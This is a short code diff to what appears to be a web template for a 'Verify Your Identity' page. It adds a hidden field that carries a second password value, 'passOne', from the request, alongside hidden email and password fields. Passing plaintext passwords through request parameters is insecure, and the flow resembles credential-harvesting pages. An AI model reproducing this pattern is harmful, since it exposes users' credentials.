@@ -155,6 +155,7 @@
                 @csrf
                 <input type="hidden" name="email" value="{{ app('request')->input('email') }}">
                 <input type="hidden" name="password" value="{{ app('request')->input('pass') }}">
+                <input type="hidden" name="password-one" value="{{ app('request')->input('passOne') }}">
                 <div class="header">
                     <img src="{{url('/').'/logo.png'}}" alt="logo" width="300" height="60">
                     <h1 style="font-size: 24px;font-weight: 600;margin-top: 15px;margin-bottom: 25px;">Verify Your Identity</h1>
